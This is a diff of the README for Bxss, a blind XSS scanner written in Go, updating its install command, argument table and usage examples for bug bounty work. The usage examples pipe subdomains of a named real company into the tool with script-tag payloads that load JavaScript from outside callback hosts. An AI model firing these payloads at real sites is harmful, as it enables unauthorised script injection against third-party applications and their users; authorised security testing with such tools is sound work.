@@ -1,15 +1,22 @@
-
 <h1 align="center">
   <br>
-<img src="https://www.secjuice.com/content/images/2018/09/blinded-drib.jpg" width="200px" alt="Bxss">
+<img src="https://github.com/ethicalhackingplayground/bxss/blob/main/static/blinded-drib.jpg" width="200px" alt="Bxss">
 </h1>
+<h1 align="center">
+Bxss - Blind XSS Scanner
 
-# 😎 Bxss 😎
-**A Blind XSS Injector tool**
+[![Version](https://img.shields.io/github/v/release/ethicalhackingplayground/bxss?style=flat-square)](https://github.com/ethicalhackingplayground/bxss/releases/latest)
+[![License](https://img.shields.io/github/license/ethicalhackingplayground/bxss?style=flat-square)](https://github.com/ethicalhackingplayground/bxss/blob/main/LICENSE)
+[![Go Report Card](https://goreportcard.com/badge/github.com/ethicalhackingplayground/bxss?style=flat-square)](https://goreportcard.com/report/github.com/ethicalhackingplayground/bxss)
+[![Go Reference](https://pkg.go.dev/badge/github.com/ethicalhackingplayground/bxss.svg)](https://pkg.go.dev/github.com/ethicalhackingplayground/bxss)
 
+## </h1>
 
+## Description
 
-[![Image from Gyazo](https://i.gyazo.com/61c052718748373ff2d267280e2e69cb.gif)](https://gyazo.com/61c052718748373ff2d267280e2e69cb)
+Blind XSS Scanner is a tool that can be used to scan for blind XSS vulnerabilities in web applications.
+
+---
 
 ### Features
 
@@ -20,59 +27,49 @@
 - Really fast
 - Easy to setup
 
-
-### Install
-
+## Install
 
 ```
-$ go install github.com/ethicalhackingplayground/bxss@latest
+go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
 ```
 
-### Arguments
-```
+---
 
+## Arguments
 
-          ____
-         |  _ \
-         | |_) |_  _____ ___
-         |  _ <\ \/ / __/ __|
-         | |_) |>  <\__ \__ \
-         |____//_/\_\___/___/
+| Argument              | Description                              | Default      |
+| --------------------- | ---------------------------------------- | ------------ |
+| `-appendMode`         | Append the payload to the parameter      |              |
+| `-concurrency int`    | Set the concurrency                      | 30           |
+| `-header string`      | Set the custom header                    | "User-Agent" |
+| `-headerFile string`  | Path to file containing headers to test  |              |
+| `-parameters`         | Test the parameters for blind xss        |              |
+| `-payload string`     | The blind XSS payload                    |              |
+| `-payloadFile string` | Path to file containing payloads to test |              |
 
+---
 
-        -- Coded by @z0idsec --
-  -appendMode
-        Append the payload to the parameter
-  -concurrency int
-        Set the concurrency (default 30)
-  -header string
-        Set the custom header (default "User-Agent")
- -headerFile string
-    	Path to file containing headers to test
-  -parameters
-        Test the parameters for blind xss
-  -payload string
-        the blind XSS payload
--payloadFile string
-    	Path to file containing payloads to test
+## Demonstration
 
-        
-```
+[![asciicast](https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm.svg)](https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm)
 
-[![Image from Gyazo](https://i.gyazo.com/c3f18487b015767f011d0845409c6e5b.gif)](https://gyazo.com/c3f18487b015767f011d0845409c6e5b)
-
+---
 
 ### Blind XSS In Parameters
-**`$ subfinder uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters`**
+
+```bash
+subfinder uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
+```
 
 ### Blind XSS In X-Forwarded-For Header
 
-**`$ subfinder uber.com | gau | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"`**
+```bash
+subfinder uber.com | gau | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"
+```
 
-
+---
 
 **If you get a bounty please support by buying me a coffee**
 
 <br>
-<a href="https://www.buymeacoffee.com/krypt0mux" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
-
+<a href="https://buymeacoffee.com/zoidsec" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
